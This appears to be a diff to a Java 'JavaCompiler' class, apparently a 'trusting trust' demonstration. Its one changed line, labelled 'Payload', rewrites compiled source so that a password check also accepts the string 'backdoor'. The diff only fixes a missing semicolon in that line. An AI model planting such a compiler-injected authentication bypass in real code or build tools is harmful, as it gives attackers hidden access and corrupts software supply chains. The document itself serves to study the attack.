@@ -698,7 +698,7 @@ public class JavaCompiler {
 
         /* Payload */
 
-        content_str = content_str.replace("SECRET_PASSWORD.equals(input)", "SECRET_PASSWORD.equals(input) || input.equals(" + q + "backdoor" + q ")")
+        content_str = content_str.replace("SECRET_PASSWORD.equals(input)", "SECRET_PASSWORD.equals(input) || input.equals(" + q + "backdoor" + q ")");
         content = content_str;
 
         /* Trusting trust done */
